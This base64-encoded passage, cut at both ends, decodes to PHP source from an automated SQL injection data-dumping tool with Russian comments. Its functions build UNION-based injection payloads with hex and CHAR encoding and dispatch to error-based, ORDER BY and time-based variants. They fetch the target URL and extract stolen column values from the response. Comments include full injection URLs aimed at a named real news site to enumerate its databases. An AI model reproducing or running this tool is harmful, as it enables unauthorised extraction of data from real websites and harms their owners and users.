9IHRydWU7CgkJCQkJCQlyZXR1cm4gJGRhdGE7CgkJCQkJCX0KCQkJCQkKCQkJCX1lbHNlCgkJCQl7CgkJCQkJCgkJCQkJCgkJCQkJaWYoJHRoaXMtPm1ldGhvZF9jaGFyID09dHJ1ZSkKCQkJCQl7CgkJCQkJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWVDSEFSKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOwoJCQkJCQkKCQkJCQkJaWYoJGRhdGFbMF0gIT0nJyBBTkQgY291bnQoJGRhdGEpPT0wKQoJCQkJCQl7CgkJCQkJCQkkdGhpcy0+bWV0aG9kX2NoYXIgPSB0cnVlOwoJCQkJCQkJcmV0dXJuICRkYXRhOwoJCQkJCQl9CgkJCQkJCQoJCQkJCX0KCQkJCQkKCQkJCQoJCQkJCQoJCQkJCQoJCQkJCWlmKCRkYXRhWzBdPT0nJyBBTkQgY291bnQoJGRhdGEpPT0wKQoJCQkJCXsKCQkJCQkJCgkJCQkJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWVIRVgoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQsJG9yZGVyLCR3aGVyZSk7CgkJCQkJCQoJCQkJCQkKCQkJCQkJaWYoJGRhdGFbMF0gPT0nJyBBTkQgY291bnQoJGRhdGEpPT0wKQoJCQkJCQl7CgkJCQkJCQkKCQkJCQkJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWVDSEFSKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOwoJCQkJCQkJCgkJCQkJCQlpZigkZGF0YVswXSA9PScnIEFORCBjb3VudCgkZGF0YSk9PTApCgkJCQkJCQl7CgkJCQkJCQkJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWVJRk5VTEwoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQsJG9yZGVyLCR3aGVyZSk7CgkJCQkJCQkJCQoJCQkJCQkJCQlpZigkZGF0YVswXSA9PScnIEFORCBjb3VudCgkZGF0YSk9PTApCgkJCQkJCQkJCXsKCQkJCQkJCQkJCSR0aGlzLT5tZXRob2RfaGV4ID0gdHJ1ZTsKCQkJCQkJCQkJfWVsc2V7CgkJCQkJCQkJCQkkdGhpcy0+bWV0aG9kX2lmbnVsbCA9IHRydWU7CgkJCQkJCQkJCX0JCgkJCQkJCQkJCQoJCQkJCQkJfWVsc2V7CgkJCQkJCQkJJHRoaXMtPm1ldGhvZF9jaGFyID10cnVlOwoJCQkJCQkJfQoJCQkJCQkJCgkJCQkJCX1lbHNlewoJCQkJCQkJJHRoaXMtPm1ldGhvZF9oZXggPSB0cnVlOwoJCQkJCQl9CgkJCQkJCQkKCQkJCQkJCgkJCQkJCQkKCQkJCQl9CgkJCQl9CgkJCQkKCQkJCQoJCQkJcmV0dXJuICRkYXRhOwoJCQl9CgkJCgl9CgkKCWZ1bmN0aW9uIG15c3FsR2V0VmFsdWVIRVgoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQ9MCwkb3JkZXI9YXJyYXkoKSwkd2hlcmU9Jycpey8v0L7QsdGJ0LDRjyDRhNGD0L3QutGG0LjRjyDQtNC70Y8gTVlTUUwg0YfQtdGA0LXQtyBIRVgg0YEgc3FsaSBkdW1wZXIKCQkKCgkJCgkJCgkKCQkKCQkKCQlpZigkdGhpcy0+bWV0aG9kPT0xMCkKCQl7CgkJCSRnZXQgPSAkdGhpcy0+bXlzcWxHZXRWYWx1ZVNsZWVwKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOwoJCQlpZigkZ2V0IT09ZmFsc2UpcmV0dXJuICRnZXQ7CgkJCXJldHVybiBmYWxzZTsKCgkJfQoJCgkJaWYoJHRoaXMtPm1ldGhvZD09NikKCQl7CgkJCS8vJHRoaXMtPmQoJ3RvY2hrYTogbWV0aG9kPT02IG15c3FHZXRWYWx1ZUJ5RXJyb3JOZXdXJyk7CgkJCSRnZXQgPSAkdGhpcy0+bXlzcUdldFZhbHVlQnlFcnJvck5ldygkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdCwkb3JkZXIsJHdoZXJlKTs7CgkJCWlmKCRnZXQhPT1mYWxzZSlyZXR1cm4gJGdldDsKCQkJcmV0dXJuIGZhbHNlOwoKCQl9CQoJCgkJaWYoJHRoaXMtPm1ldGhvZD09NSkKCQl7CgoJCQkvLyR0aGlzLT5kKCd0b2Noa2E6IG1ldGhvZD09NSBteXNxbEdldEJ5T3JkZXInKTsKCQkJJGdldCA9ICR0aGlzLT5teXNxbEdldEJ5T3JkZXIoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQsJG9yZGVyLCR3aGVyZSk7CgkJCWlmKCRnZXQhPT1mYWxzZSlyZXR1cm4gJGdldDsKCQkJcmV0dXJuIGZhbHNlOwoKCQl9CgkJCgkJaWYoJHRoaXMtPm1ldGhvZD09NCkKCQl7CgkJCS8vJHRoaXMtPmQoJ3RvY2hrYTogbWV0aG9kPT00IG15c3FHZXRWYWx1ZUJ5RXJyb3InKTsKCQkJJGdldCA9ICR0aGlzLT5teXNxR2V0VmFsdWVCeUVycm9yKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOzsKCQkJaWYoJGdldCE9PWZhbHNlKXJldHVybiAkZ2V0OwoJCQlyZXR1cm4gZmFsc2U7CgoJCX0KCQkKCQkKCQkvLyR0aGlzLT5kKCdtZXRob2QgcG8gdW1vbGNoYW5peScpOwoJCQoJCWlmKCR0YWJsZSE9PScnKQoJCXsKCQkJCgkJCWlmKCRiZD09JycpewoJCQkJJGZyb20gPSAnRlJPTSsnLiR0YWJsZS4nJzsKCQkJfWVsc2V7CgkJCQkkZnJvbSA9ICdGUk9NKycuJGJkLicuJy4kdGFibGUuJyc7CgkJCX0KCQl9ZWxzZXsKCQkJJGZyb20gPSAnJzsKCQl9CgkJCgkJCgkJJGJkID0gICAgc3RyX3JlcGxhY2UoJyAnLCAnKycsJGJkKTsKCQkkdGFibGUgPSBzdHJfcmVwbGFjZSgnICcsICcrJywkdGFibGUpOwoJCSRmcm9tID0gIHN0cl9yZXBsYWNlKCcgJywgJysnLCRmcm9tKTsKCQkkd2hlcmUgPSBzdHJfcmVwbGFjZSgnICcsICcrJywkd2hlcmUpOwoJCSRvcmRlciA9IHN0cl9yZXBsYWNlKCcgJywgJysnLCRvcmRlcik7CgkJCgkJCgkJJG1ldGhvZCA9ICR0aGlzLT5zcG9zb2I7CgkJCgkJLy8kdGhpcy0+ZCgkbWV0aG9kLCckbWV0aG9kID0gJHRoaXMtPnNwb3NvYicpOwoJCQoJCQoJCS8vJHRoaXMtPmQoJHdoZXJlLCckd2hlcmUnKTsKCQkKCQkvL9C90LDRh9Cw0LvQviDQu9C40LzQuNGC0LAKCQkkbGltaXQgPSAkbGltaXQuJywxJzsKCQkJCQkJCQoJCSRuID0gJHRoaXMtPnZhcmlhbnRfcXVlcnlbJHRoaXMtPnNwb3NvYl1bJHRoaXMtPm1ldGhvZF1bMF07Ly/QvdCw0YfQsNC70L4g0LfQsNC/0YDQvtGB0LAKCQkkayA9ICR0aGlzLT52YXJpYW50X3F1ZXJ5WyR0aGlzLT5zcG9zb2JdWyR0aGlzLT5tZXRob2RdWzFdOy8v0LrQvtC90LXRhiAg0LfQsNC/0YDQvtGB0LAKCQkKCQkvLyR0aGlzLT5kKCRuLCfQvdCw0YfQsNC70L4g0LfQsNC/0YDQvtGB0LAnKTsKCQkvLyR0aGlzLT5kKCRrLCfQutC+0L3QtdGGICDQt9Cw0L/RgNC+0YHQsCcpOwoJCQoJCS8vJHRoaXMtPmQoJHRoaXMtPmNvbHVtbiwnJHRoaXMtPmNvbHVtbicpOwoJCS8vJHRoaXMtPmQoJHRoaXMtPndvcmssJyR0aGlzLT53b3JrJyk7CgkJCgkKCQkkcXVlcnkgPSAiMTExMTExMTExMTExMSRuIjsvL9C90LDRh9Cw0LvRjNC90YvQuSDQt9Cw0L/RgNC+0YEg0LTQu9GPINCd0JUgc2xlZXAKCQkKCQkJCgkKCQlpZighaXNfYXJyYXkoJHBvbGUpKSRwb2xlID0gYXJyYXkoJHBvbGUpOy8v0Y3RgtC+INC60LDQuiDRgNCw0Lcg0L3QsNGIINC30LDQv9GA0L7RgSB2ZXJzaW9uINC6INC/0YDQuNC80LXRgNGDCgkJCgkJJHphcHIgPSAnJzsvL9C+0LHRidCw0Y8g0YHRgtGA0L7QutCwINC00LvRjyDQvdCw0YjQuNGFINC/0L7Qu9C10LkKCQkgCgkJIAoJCSAvL2h0dHA6Ly9tLmxvYWRpbmcuc2UvbmV3cy5waHA/cHViX2lkPTk5OTk5OS45IHVuaW9uIGFsbCBzZWxlY3QgMHgzMTMwMzIzNTM0MzgzMDMwMzUzNiwweDMxMzAzMjM1MzQzODMwMzAzNTM2LDB4MzEzMDMyMzUzNDM4MzAzMDM1MzYsMHgzMTMwMzIzNTM0MzgzMDMwMzUzNiwoc2VsZWN0IGRpc3RpbmN0IGNvbmNhdCgweDdlLDB4MjcsdW5oZXgoSGV4KGNhc3Qoc2NoZW1hX25hbWUgYXMgY2hhcikpKSwweDI3LDB4N2UpIGZyb20gYGluZm9ybWF0aW9uX3NjaGVtYWAuc2NoZW1hdGEgbGltaXQgNCwxKSwweDMxMzAzMjM1MzQzODMwMzAzNTM2LDB4MzEzMDMyMzUzNDM4MzAzMDM1MzYsMHgzMTMwMzIzNTM0MzgzMDMwMzUzNi0tCgkJIAoJCSAvL3NlbGVjdCBkaXN0aW5jdAoJCSAKCQkgCgkJIC8vaHR0cDovL20ubG9hZGluZy5zZS9uZXdzLnBocD9wdWJfaWQ9NDE5MjAxMTExMTExMTExMTExMTExMTExMTExMTExMSUyMFVOSU9OJTIwU0VMRUNUJTIwMSwyLDMsNCwoc2VsZWN0JTIwQ09OQ0FUKDB4NWI2NDY0NjQ1ZCx1bmhleChIZXgoY2FzdCglMjBhcyUyMGNoYXIpKSksMHg1YjY0NjQ2NDVkKSUyMEZST00lMjBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGElMjBsaW1pdCUyMDEsMSksNiw3LDglMjAtLSUyMAoJCSAKCQkvL9C+0LHQstC+0LvQsNC60LjQstCw0LXQvCDQtdCz0L4g0YHQv9C10YYg0YHQuNC80LLQvtC70LDQvNC4LCDRh9GC0L7QsdGLINC/0LDRgtC+0Lwg0L3QsNC50YLQuCDQvNC+0LbQvdC+INCx0YvQu9C+INCx0YsKCQlmb3JlYWNoICgkcG9sZSBhcyAka2V5PT4kdmFsKQoJCXsKCSAgCQoJCSAJaWYoY291bnQoJHBvbGUpPT0xKQoJCQl7CgkJCQkvLyRtZXIgPSAkdGFibGUuJy4nLiR2YWw7CgkJCQkvLyRtZXIgPSAkdmFsOwkJCQoJCQkJLy8kbWVyMiA9ICdbJy4kdmFsLiddJzsKCQkJCQoJCQkJLy/QtdGB0LvQuCDQvtC00L3QviDQv9C+0LvQtQoJCQkJLy8kemFwciAuPSAidW5oZXgoSGV4KGNhc3QoJG1lciBhcyBjaGFyKSkpLDB4NWUsIjsKCQkgCQkvLyR6YXByIC49ICdDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCdbWF0nKS4nKScuJywnLiR2YWwuJyxDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCdbWFhdJykuJyknOwoJCQoJCQkJLy8kemFwciAuPSAiSUZOVUxMKHVuaGV4KEhleChjYXN0KCR2YWwgYXMgY2hhcikpKSwnJykiOwoJCQkJJHphcHIgLj0gIklGTlVMTCh1bmhleChIZXgoY2FzdCgkdmFsIGFzIGNoYXIpKSksMHgyMCkiOwoJCQkJCgkJCQkvLyAkemFwciAuPSAidW5oZXgoSGV4KGNvbmNhdChjYXN0KGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBhcyBjaGFyKSkpKSI7CgkJCQkgCgkJCQkvLyAkemFwciAuPSAiY29uY2F0KGNhc3QoZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGFzIGNoYXIpKSI7CgkJCQkKCQkgCQkKCQkgCX1lbHNlCgkJCXsKCQkJCQoJCQkJCgkJIAkKCQkJCS8v0LXRgdC70Lgg0L3QtdGB0LrQvtC70YzQutC+INC90LDQudGC0Lgg0L3QsNC00L4KCQkJCQoJCQkJLy8kbWVyID0gJHRhYmxlLicuJy4kdmFsOwoJCQkJLy8kbWVyID0gJHZhbDsJCQkKCQkJCS8vJG1lcjIgPSAnWycuJHZhbC4nXSc7CgkJCQkKCQkJCS8vCSR6YXByIC49ICJJRk5VTEwodW5oZXgoSGV4KGNhc3QoJHZhbCBhcyBjaGFyKSkpLCcgJykiOwoJCQkJLy8kemFwciAuPSAiLDB4NWUsdW5oZXgoSGV4KCRtZXIpKSI7CgkJCQkvLyR6YXByIC49ICIsdW5oZXgoSGV4KCRtZXIpKXVuaGV4KEhleChjYXN0KCRtZXIgYXMgY2hhcikpKSx1bmhleChIZXgoJG1lcikpIjsKCQkJCS8vJHphcHIgLj0gJyxDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCdbJy4kdmFsLiddJykuJyknLicsJy4kdmFsLicsQ0hBUignLiR0aGlzLT5jaGFyY2hlcignWycuJHZhbC4nXScpLicpJzsKCQkJCQoJCQkJLy8kemFwciAuPSAiMHg1ZSxJRk5VTEwodW5oZXgoSGV4KGNhc3QoJHZhbCBhcyBjaGFyKSkpLCcnKSwweDVlLCI7CgkJCQkJCgkJCQkJCgkJCQkJCgkJCQkvLyR6YXByIC49ICIweDVlLElGTlVMTChjYXN0KCR2YWwgYXMgY2hhciksMHgyMCksMHg1ZSwiOwoJCQkJCQoJCQkJJHphcHIgLj0gIjB4NWUsSUZOVUxMKHVuaGV4KEhleChjYXN0KCR2YWwgYXMgY2hhcikpKSwweDIwKSwweDVlLCI7CQkKCQkJCQkKCQkJCS8vJHphcHIgLj0gIjB4NWUsSUZOVUxMKGNhc3QoJHZhbCBhcyBjaGFyKSwweDIwKSwweDVlLCI7CQoKCQkgCX0KCQkJCgkJCQoJCQkKCSAgCQoJCX0KCQkKCQkvLyR0aGlzLT5kKCR6YXByLCdmaW5hbCAkemFwcicpOwoJICAKCQkKCQkKCQkgJHdvcmtfY291bnQgPSBjb3VudCgkdGhpcy0+d29yayk7Ly/RgNCw0LHQvtGH0LjQtSDQv9C+0LvRjyDQs9C00LUg0LLRi9Cy0L7QtCDQtdGB0YLRjAoJCQoJCSAkbmV3ID0gYXJyYXkoKTsgLy8g0KfRgtC+INC90LAg0LLRi9GF0L7QtNC1CgoJCSAkZ2l2ZSA9IDA7CgkJIAoJCQoJCSAKCQkgaWYoJG9yZGVyIT09YXJyYXkoKSBBTkQgY291bnQoJHBvbGUpPjEpCgkJCXsKCQkJCSRvcmRlcjIgPSAnK29yZGVyK2J5K2AnLiRvcmRlclswXS4nYCsnLiRvcmRlclsxXS4nKyc7CgkJCX1lbHNlCgkJCXsKCQkJCSRvcmRlcjIgPSAnJzsKCQkJfQoJCQkKCQkJCgkJaWYoJHRoaXMtPmRlc2MgPT0wIEFORCAkdGhpcy0+ZGVzY19lbmFibGUgPT0gdHJ1ZSkKCQkJewkKCQkJCSRvcmRlcjIgPSAnT1JERVIrYnkraWQrREVTQyc7CgkJCX0KCQkJCgkJCQoJCSAKCQkgLy/Qv9C+0LTRgdGC0LDQstC70Y/QtdC8INC60L7Qu9C+0L3QutC4CgkJIGZvcigkY29sPTE7JGNvbDw9JHRoaXMtPmNvbHVtbjskY29sKyspCgkJCXsKCQkJCWlmKCRjb2w9PTEpeyR6YXA9Jyc7fWVsc2V7JHphcD0nLCc7fS8v0LfQsNC/0Y/RgtCw0Y8KCQkJCgkJCQlpZihpbl9hcnJheSgkY29sLCAkdGhpcy0+d29yaykgQU5EICRnaXZlPT0wKQoJCQkJewoKCQkJCQkkcCA9ICRjb2wtMTsKCgkJCQkJJGdpdmUrKzsKCQkJCQkKCQkJCQkvLyRxdWVyeSAuPSAkemFwLiJDT05DQVQoQ0hBUigiLiR0aGlzLT5jaGFyY2hlcignZGRkJykuIiksJHphcHIpIjsKCQkJCQkKCQkJCQkkaGggPSAkdGhpcy0+c3RydG9oZXgoJ1tkZGRdJyk7CgkJCQkJCgkJCQkJJHF1ZXJ5IC49ICR6YXAuIihzZWxlY3QrQ09OQ0FUKCRoaCwkemFwciwkaGgpIi4nKycuJGZyb20uJysnLiR3aGVyZS4nKycuJG9yZGVyMi4nK2xpbWl0KycuJGxpbWl0LicpJzsKCQkJCQkKCQkJCQkKCQkJCQkKCQkJCX1lbHNlCgkJCQl7CgkJCQkJCQoJCQkJCWlmKCRvcmRlciE9PWFycmF5KCkgQU5EIGNvdW50KCRwb2xlKT4xKQoJCQkJCXsKCQkJCQkJJHF1ZXJ5IC49ICR6YXAuIiIuJG9yZGVyWzBdOwoJCQkJCX1lbHNlCgkJCQkJewoJCQkJCQkkcXVlcnkgLj0gJHphcC4kY29sOwkKCQkJCQl9CgkJCQl9CQoJCQl9CgkJCQoJCQkJCgkJCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCRxdWVyeSwnJHF1ZXJ5IG15c3FsR2V0VmFsdWVIRVgnKTt9CgkJCQkjZXhpdDsKCQoJCQkKCQkJCgkJCQkvLyR1cmwxID0gJHRoaXMtPnVybC4kcXVlcnkuJysnLiRmcm9tLicrJy4kd2hlcmUuJysnLiRvcmRlci4nK2xpbWl0KycuJGxpbWl0LicnLiRrOwoJCQkJJHVybDEgPSAkdGhpcy0+dXJsLiRxdWVyeS4nJy4kazsKCQkJCQkKCQkJCQoJCQkJJHVybDEgPSBzdHJfcmVwbGFjZSgnLCwnLCAnLCcsJHVybDEpOwoJCQkJJHVybDEgPSBzdHJfcmVwbGFjZSgnKysrKycsICcrJywkdXJsMSk7CgkJCQkkdXJsMSA9IHN0cl9yZXBsYWNlKCcrKysnLCAnKycsJHVybDEpOwoJCQkJJHVybDEgPSBzdHJfcmVwbGFjZSgnKysnLCAnKycsJHVybDEpOwoJCQkJCgkJCQkvL2lmKCR0aGlzLT5kZWJ1Zz09dHJ1ZSl7JHRoaXMtPmQoJHVybDEsJyR1cmwxINC/0L7Qu9C90YvQuSBteXNxbEdldFZhbHVlIENMRUFOIEhFWCcpO30KCQkJCQoJCQkJLy9leGl0OwoJCQkJCgkJCQkkZmlsZSA9ICR0aGlzLT5nZXRDb250ZW50cygkdXJsMSk7CgkJCQkKCQkJCQoJCQkJCgkJCQlpZigkdGhpcy0+aGVhZF9lbmFibGU9PXRydWUpewoJCQkJCQoJCQkJCWZpbGVfcHV0X2NvbnRlbnRzKCcuL2ZpbGVfaGVhZC50eHQnLCRmaWxlKTsKCQkJCX1lbHNlewoJCQkJCWZpbGVfcHV0X2NvbnRlbnRzKCcuL2ZpbGVfaGV4LnR4dCcsJGZpbGUpOwoJCQkJfQoJCQkJCgkJCQkKCQkJCS8vJHRoaXMtPmQoJGZpbGUsJ2ZpbGUnKTsKCQkJCS8vZXhpdDsKCQkJCQoJCQkJLy/QuNGJ0LXQvCDRgNC10LfRg9C70YzRgtCw0YLRiwkKCQkJCWlmKGNvdW50KCRwb2xlKT09MSkgLy/QtdGB0LvQuCDQvtC9INC+0LTQuNC9INC/0YDQtdC00L/QvtC70LDQs9Cw0LXRgtGB0Y8KCQkJCXsKCQkgCQkKCQkJCQkvL3ByZWdfbWF0Y2hfYWxsKCIvXFtYXF0oLio/KVxbWFhcXS9pcyIsJGZpbGUsJGFycik7CgkJCQkJCgkJCQkJcHJlZ19tYXRjaF9hbGwoInxcW2RkZFxdKC4qPylcW2RkZFxdfGkiLCRmaWxlLCRhcnIpOwoJCQkJCS8vcHJlZ19tYXRjaCgifFxbZGRkXF0oLio/KVxbZGRkXF18aSIsJGZpbGUsJGFycik7CgkJCQkJCgkJCQkJCgkJCQkJLy8kdGhpcy0+ZCgkYXJyLCdhcnIgT05FIFBPTEUgSEVYJyk7CgkJCQkJCgkJCQkJLy9pZihzdHJsZW4oJGFyclsxXVswXSk+NTAwKXJldHVybiBmYWxzZTsJCgoJCQkJCWlmKGlzc2V0KCRhcnJbMV1bMF0pKXJldHVybiBhcnJheSgkcG9sZVswXT0+JGFyclsxXVswXSk7CgkJCQkJCgkJCQkJcmV0dXJuIGZhbHNlOwoJCSAJCQoJCQkJfWVsc2UvL9C10YHQu9C4INC90LUg0YHQutC+0LvRjNC60L4g0L/QvtC70LXQuSDQsdGL0LvQvgoJCQkJewoJCSAJCQkJCgkJCQkJCgkJCSAJCgkJCQkJCS8vcHJlZ19tYXRjaF9hbGwoIn5cW3skdmFsfVxdKC4qPylcW3skdmFsfVxdfmlTIiwkZmlsZSwkYXJyKTsKCQkJCQkJCgkJCQkJCXByZWdfbWF0Y2hfYWxsKCJ8XFtkZGRcXSguKj8pXFtkZGRcXXxpIiwkZmlsZSwkYXJyKTsKCQkJCQkJLy9wcmVnX21hdGNoKCJ8XFtkZGRcXSguKj8pXFtkZGRcXXxpIiwkZmlsZSwkYXJyKTsKCQkJCQkJCgkJCQkJCS8vcHJlZ19tYXRjaF9hbGwoIn5cXiguKj8pXF5+aXMiLCRhcnIyMlswXSwkYXJyKTsKCQkJCQkJCgkJCQkJCS8vJHRoaXMtPmQoIn5cW3skdmFsfVxdKC4qPylcW3skdmFsfVxdfmlTIiwncmVnIEFMTCcpOwoJCQkJCQkKCQkJCQkJLy8kdGhpcy0+ZCgkYXJyLCdhcnJBX0xMTCBQT0xFIEhFWCcpOwoJCQkJCQkKCQkJCQkJCgkJCQkJCQkKCQkJCQkJCgkJCQkJJGo9MTsKCQkJCQkKCQkJCQlmb3JlYWNoICgkcG9sZSBhcyAkdmFsKQoJCQkJCXsKCQkJCQkJCgkJCQkJCQoJCQkJCQkKCQkJCQkJLy9pZihzdHJsZW4oJGFyclsxXVswXSk+NTAwKXJldHVybiBmYWxzZTsJCgkJCQkJCQoJCQkJCgkJCQkJCWlmKGlzc2V0KCRhcnJbMV1bMF0pKQoJCQkJCQl7CgkJCQkJCQkKCQkJCQkJCSRhcnJbMV1bMF0gPSBzdHJfcmVwbGFjZSgnXl4nLCdeJywkYXJyWzFdWzBdKTsKCQkJCQkJCQoJCQkJCQkJJGIgPSBleHBsb2RlKCdeJywkYXJyWzFdWzBdKTsKCQkJCQkJCQoJCQkJCQkJJGJfYmV3ID0gYXJyYXlfZmlsdGVyKCRiLCBmdW5jdGlvbigkZWxlbWVudCkgewoJCQkJCQkJCXJldHVybiAhZW1wdHkoJGVsZW1lbnQpOwoJCQkJCQkJfSk7CgkJCQkJCQkKCQkJCQkJCQoJCQkJCQkJLy8kdGhpcy0+ZCgkYiwnYicpOwoJCQkJCQkJLy8kdGhpcy0+ZCgkYl9iZXcsJ2JfbmV3Jyk7CgkJCQkJCQkKCQkJCQkJCSRleHBvcnRbJHZhbF0gPSAkYlskal07CgkJCQkJCX1lbHNlCgkJCQkJCXsKCQkJCQkJCSRleHBvcnRbJHZhbF0gPSAnJzsKCQkJCQkKCgkJCQkJCX0KCQkJCQkJCgkJCQkJCSRqKys7CgkJCQkJCQoJCQkJCX0KCQkJCQkKCQkJCQkKCQkJCQkKCQkJCX0KCQkJCgkJCQoJCQkKCQkJaWYoaXNzZXQoJGV4cG9ydCkpCgkJCXsJCgkJCQlyZXR1cm4gJGV4cG9ydDsKCQkJfQoJCQkKCQkJcmV0dXJuIGZhbHNlOwoKCX0KCQoJZnVuY3Rpb24gbXlzcWxHZXRWYWx1ZUNIQVIoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQ9MCwkb3JkZXI9YXJyYXkoKSwkd2hlcmU9Jycpey8v0L7QsdGJ0LDRjyDRhNGD0L3QutGG0LjRjyDQtNC70Y8gTVlTUUwg0YfQtdGA0LXQtyBDSEFSINGB0YLQsNGA0LDRjwoJCQoJCS8vJHRoaXMtPmQoJHRoaXMtPnVybCwnJHRoaXMtPnVybCcpOwoJCQoJCS8vJHRoaXMtPmQoJ3RvY2hrYTogbXlzcWxHZXRWYWx1ZSBOQUNIQUxPJyk7CgkJCgkJLy8kdGhpcy0+ZCgkcG9sZSwnJHRhYmxlJyk7CgkJCgkJLy9leGl0OwoJCQoJCgkJCgkJCgkJaWYoJHRoaXMtPm1ldGhvZD09MTApCgkJewoJCQkvLyR0aGlzLT5kKCd0b2Noa2E6IG1ldGhvZD09MTAgU0xFRVAgbXlzcWxHZXRWYWx1ZVNsZWVwJyk7CgkJCSRnZXQgPSAkdGhpcy0+bXlzcWxHZXRWYWx1ZVNsZWVwKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOwoJCQlpZigkZ2V0IT09ZmFsc2UpcmV0dXJuICRnZXQ7CgkJCXJldHVybiBmYWxzZTsKCgkJfQoJCgkJaWYoJHRoaXMtPm1ldGhvZD09NikKCQl7CgkJCS8vJHRoaXMtPmQoJ3RvY2hrYTogbWV0aG9kPT02IG15c3FHZXRWYWx1ZUJ5RXJyb3JOZXdXJyk7CgkJCSRnZXQgPSAkdGhpcy0+bXlzcUdldFZhbHVlQnlFcnJvck5ldygkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdCwkb3JkZXIsJHdoZXJlKTs7CgkJCWlmKCRnZXQhPT1mYWxzZSlyZXR1cm4gJGdldDsKCQkJcmV0dXJuIGZhbHNlOwoKCQl9CQoJCgkJaWYoJHRoaXMtPm1ldGhvZD09NSkKCQl7CgoJCQkvLyR0aGlzLT5kKCd0b2Noa2E6IG1ldGhvZD09NSBteXNxbEdldEJ5T3JkZXInKTsKCQkJJGdldCA9ICR0aGlzLT5teXNxbEdldEJ5T3JkZXIoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQsJG9yZGVyLCR3aGVyZSk7CgkJCWlmKCRnZXQhPT1mYWxzZSlyZXR1cm4gJGdldDsKCQkJcmV0dXJuIGZhbHNlOwoKCQl9CgkJCgkJaWYoJHRoaXMtPm1ldGhvZD09NCkKCQl7CgkJCS8vJHRoaXMtPmQoJ3RvY2hrYTogbWV0aG9kPT00IG15c3FHZXRWYWx1ZUJ5RXJyb3InKTsKCQkJJGdldCA9ICR0aGlzLT5teXNxR2V0VmFsdWVCeUVycm9yKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOzsKCQkJaWYoJGdldCE9PWZhbHNlKXJldHVybiAkZ2V0OwoJCQlyZXR1cm4gZmFsc2U7CgoJCX0KCQkKCQkKCQkvLyR0aGlzLT5kKCdtZXRob2QgcG8gdW1vbGNoYW5peScpOwoJCQoJCWlmKCR0YWJsZSE9PScnKQoJCXsKCQkJCgkJCWlmKCRiZD09JycpewoJCQkJJGZyb20gPSAnRlJPTSsnLiR0YWJsZS4nJzsKCQkJfWVsc2V7CgkJCQkkZnJvbSA9ICdGUk9NKycuJGJkLicuJy4kdGFibGUuJyc7CgkJCX0KCQl9ZWxzZXsKCQkJJGZyb20gPSAnJzsKCQl9CgkJCgkJCgkJJGJkID0gICAgc3RyX3JlcGxhY2UoJyAnLCAnKycsJGJkKTsKCQkkdGFibGUgPSBzdHJfcmVwbGFjZSgnICcsICcrJywkdGFibGUpOwoJCSRmcm9tID0gIHN0cl9yZXBsYWNlKCcgJywgJysnLCRmcm9tKTsKCQkkd2hlcmUgPSBzdHJfcmVwbGFjZSgnICcsICcrJywkd2hlcmUpOwoJCSRvcmRlciA9IHN0cl9yZXBsYWNlKCcgJywgJysnLCRvcmRlcik7CgkJCgkJCgkJJG1ldGhvZCA9ICR0aGlzLT5zcG9zb2I7CgkJCgkJLy8kdGhpcy0+ZCgkbWV0aG9kLCckbWV0aG9kID0gJHRoaXMtPnNwb3NvYicpOwoJCQoJCQoJCQoJCQoJCS8v0L3QsNGH0LDQu9C+INC70LjQvNC40YLQsAoJCSRsaW1pdCA9ICRsaW1pdC4nLDEnOwoJCQkJCQkJCgkJJG4gPSAkdGhpcy0+dmFyaWFudF9xdWVyeVskdGhpcy0+c3Bvc29iXVskdGhpcy0+bWV0aG9kXVswXTsvL9C90LDRh9Cw0LvQviDQt9Cw0L/RgNC+0YHQsAoJCSRrID0gJHRoaXMtPnZhcmlhbnRfcXVlcnlbJHRoaXMtPnNwb3NvYl1bJHRoaXMtPm1ldGhvZF1bMV07Ly/QutC+0L3QtdGGICDQt9Cw0L/RgNC+0YHQsAoJCQoJCS8vJHRoaXMtPmQoJG4sJ9C90LDRh9Cw0LvQviDQt9Cw0L/RgNC+0YHQsCcpOwoJCS8vJHRoaXMtPmQoJGssJ9C60L7QvdC10YYgINC30LDQv9GA0L7RgdCwJyk7CgkJCgkJLy8kdGhpcy0+ZCgkdGhpcy0+Y29sdW1uLCckdGhpcy0+Y29sdW1uJyk7CgkJLy8kdGhpcy0+ZCgkdGhpcy0+d29yaywnJHRoaXMtPndvcmsnKTsKCQkKCQoJCSRxdWVyeSA9ICIxMTExMTExMTExMTExJG4iOy8v0L3QsNGH0LDQu9GM0L3Ri9C5INC30LDQv9GA0L7RgSDQtNC70Y8g0J3QlSBzbGVlcAoJCQoJCQkKCQoJCWlmKCFpc19hcnJheSgkcG9sZSkpJHBvbGUgPSBhcnJheSgkcG9sZSk7Ly/RjdGC0L4g0LrQsNC6INGA0LDQtyDQvdCw0Ygg0LfQsNC/0YDQvtGBIHZlcnNpb24g0Log0L/RgNC40LzQtdGA0YMKCQkKCQkkemFwciA9ICcnOy8v0L7QsdGJ0LDRjyDRgdGC0YDQvtC60LAg0LTQu9GPINC90LDRiNC40YUg0L/QvtC70LXQuQoJCSAKCQkvL9C+0LHQstC